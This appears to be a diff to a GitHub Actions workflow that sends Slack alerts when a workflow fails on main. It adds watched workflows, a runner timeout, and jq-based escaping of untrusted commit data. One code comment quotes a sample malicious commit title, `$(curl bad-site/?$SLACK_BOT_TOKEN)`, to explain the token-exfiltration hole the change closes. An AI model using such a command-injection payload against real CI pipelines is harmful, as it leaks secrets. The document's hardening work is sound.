@@ -26,11 +26,18 @@ name: Notify Slack on main-branch workflow failure
 on:
   workflow_run:
     workflows:
+      # Every workflow that runs on `push` to `main`. Add new entries here as
+      # more push-to-main workflows land — `workflow_run.workflows` does NOT
+      # support wildcards. Scope is broader than just auto-deploy workflows
+      # because any required-gate failure on main is operationally silent if
+      # nobody happens to look at the Actions tab.
       - Alerts Infra
       - Metrics Bridge
       - Infra
       - Aegis App Engine
       - CI
+      - Trunk
+      - Code Health — Duplication
     types: [completed]
   # workflow_dispatch (no inputs — checkov/CKV_GHA_7 forbids them) lets you
   # smoke-test the Slack wiring by manually running this workflow from the
@@ -49,13 +56,18 @@ jobs:
       (github.event.workflow_run.conclusion == 'failure' &&
        github.event.workflow_run.head_branch == 'main' &&
        github.event.workflow_run.event == 'push')
-    runs-on: ubuntu-latest
+    runs-on: blacksmith-4vcpu-ubuntu-2404
+    timeout-minutes: 5
     steps:
       - name: Post to #ci-failures
         env:
           SLACK_BOT_TOKEN: ${{ secrets.TF_VAR_SLACK_BOT_TOKEN }}
           IS_TEST: ${{ github.event_name == 'workflow_dispatch' }}
-          # workflow_run context (only populated for real failures)
+          # workflow_run context (only populated for real failures).
+          # IMPORTANT: never interpolate any of these into a shell command —
+          # commit messages can contain backticks or $(…) and would execute
+          # against the runner. Pass them to jq via --arg below, which
+          # escapes safely.
           WORKFLOW_NAME: ${{ github.event.workflow_run.name }}
           RUN_URL: ${{ github.event.workflow_run.html_url }}
           COMMIT_SHA: ${{ github.event.workflow_run.head_sha }}
@@ -63,28 +75,48 @@ jobs:
           ACTOR: ${{ github.event.workflow_run.triggering_actor.login }}
         run: |
           set -euo pipefail
-          if [ "$IS_TEST" = "true" ]; then
-            TITLE="🧪 *Notify-Slack wiring test*"
-            BODY="If you can read this, the listener workflow + #ci-failures channel + bot scopes are all wired correctly. Safe to ignore."
-          else
-            SHORT_SHA="${COMMIT_SHA:0:7}"
-            TITLE="❌ *<${RUN_URL}|${WORKFLOW_NAME}>* failed on \`main\`"
-            BODY="*Commit:* \`${SHORT_SHA}\` — ${COMMIT_MSG}\n*Triggered by:* ${ACTOR}\n\n<${RUN_URL}|View failed run →>"
-          fi
 
-          # Build payload via jq to handle escaping safely.
-          PAYLOAD=$(jq -nc \
-            --arg ch '#ci-failures' \
-            --arg title "$TITLE" \
-            --arg body "$BODY" \
-            '{
-              channel: $ch,
-              text: $title,
-              blocks: [
-                {type: "section", text: {type: "mrkdwn", text: $title}},
-                {type: "section", text: {type: "mrkdwn", text: $body}}
-              ]
-            }')
+          # Build the entire Slack payload in one jq invocation. All
+          # untrusted strings (commit message, actor login, URL) flow
+          # through --arg so they're JSON-escaped by jq, not interpolated
+          # into shell or built up as bash strings. This closes a token-
+          # exfiltration vector that earlier drafts opened: a commit
+          # titled `$(curl bad-site/?$SLACK_BOT_TOKEN)` would have been
+          # executed by the shell before reaching the API call.
+          #
+          # jq's string interpolation `\($var)` ALSO handles newlines
+          # safely — `\n` inside a jq string literal is a real newline,
+          # so Slack's mrkdwn renders multi-line blocks correctly. (The
+          # earlier `BODY="...\n..."` bash form produced literal "\n"
+          # text in Slack instead of line breaks.)
+          if [ "$IS_TEST" = "true" ]; then
+            PAYLOAD=$(jq -nc \
+              --arg ch '#ci-failures' \
+              '{
+                channel: $ch,
+                text: "🧪 *Notify-Slack wiring test*",
+                blocks: [
+                  {type: "section", text: {type: "mrkdwn", text: "🧪 *Notify-Slack wiring test*"}},
+                  {type: "section", text: {type: "mrkdwn", text: "If you can read this, the listener workflow + #ci-failures channel + bot scopes are all wired correctly. Safe to ignore."}}
+                ]
+              }')
+          else
+            PAYLOAD=$(jq -nc \
+              --arg ch '#ci-failures' \
+              --arg wf "$WORKFLOW_NAME" \
+              --arg url "$RUN_URL" \
+              --arg sha "${COMMIT_SHA:0:7}" \
+              --arg msg "$COMMIT_MSG" \
+              --arg actor "$ACTOR" \
+              '{
+                channel: $ch,
+                text: ("❌ " + $wf + " failed on main (" + $sha + ")"),
+                blocks: [
+                  {type: "section", text: {type: "mrkdwn", text: ("❌ *<" + $url + "|" + $wf + ">* failed on `main`")}},
+                  {type: "section", text: {type: "mrkdwn", text: ("*Commit:* `" + $sha + "` — " + $msg + "\n*Triggered by:* " + $actor + "\n\n<" + $url + "|View failed run →>")}}
+                ]
+              }')
+          fi
 
           RESPONSE=$(curl -fsS -X POST https://slack.com/api/chat.postMessage \
             -H "Authorization: Bearer $SLACK_BOT_TOKEN" \
